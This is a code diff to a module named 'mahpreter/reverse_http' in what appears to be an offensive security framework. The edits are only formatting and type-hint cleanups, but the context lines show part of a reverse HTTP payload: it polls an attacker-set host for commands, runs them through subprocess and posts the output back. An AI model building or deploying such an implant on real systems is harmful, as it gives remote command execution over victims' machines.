@@ -1,6 +1,8 @@
+from typing import Any
+
 from core.module import BaseModule
 from core.option import Option
-from typing import Dict, Any
+
 
 class Payload(BaseModule):
     Name = "mahpreter/reverse_http"
@@ -13,7 +15,9 @@ class Payload(BaseModule):
         self.Options = {
             "LHOST": Option("LHOST", "127.0.0.1", True, "Bağlanılacak Sunucu/IP."),
             "LPORT": Option("LPORT", 80, True, "Bağlanılacak Port (HTTP)."),
-            "OUTPUT": Option("OUTPUT", "", False, "Payload'ı dosyaya kaydet.", completion_dir=".")
+            "OUTPUT": Option(
+                "OUTPUT", "", False, "Payload'ı dosyaya kaydet.", completion_dir="."
+            ),
         }
 
     def generate(self) -> str:
@@ -33,10 +37,10 @@ def connect():
             req = urllib.request.Request(f"{{SERVER_URL}}/connect/{{ID}}")
             resp = urllib.request.urlopen(req)
             cmd = resp.read().decode("utf-8")
-            
+
             if cmd == "terminate":
                 break
-            
+
             if cmd:
                 output = subprocess.getoutput(cmd)
                 # Send output via POST
@@ -52,9 +56,9 @@ if __name__ == "__main__":
 """
         return payload.strip()
 
-    def run(self, options: Dict[str, Any]):
+    def run(self, options: dict[str, Any]):
         code = self.generate()
-        
+
         output_path = self.get_option_value("OUTPUT")
         if output_path:
             if not output_path.endswith(".py"):
